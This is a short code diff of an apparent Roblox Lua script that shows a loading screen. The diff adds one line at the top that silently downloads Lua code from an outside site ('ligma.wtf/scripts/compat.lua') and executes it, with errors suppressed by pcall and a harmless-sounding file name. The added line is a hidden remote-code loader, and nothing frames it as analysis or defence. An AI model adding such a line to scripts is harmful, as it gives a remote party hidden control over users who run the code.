@@ -1,3 +1,4 @@
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 if not game:IsLoaded() then
     --// funni loading screen by spec
     --[[
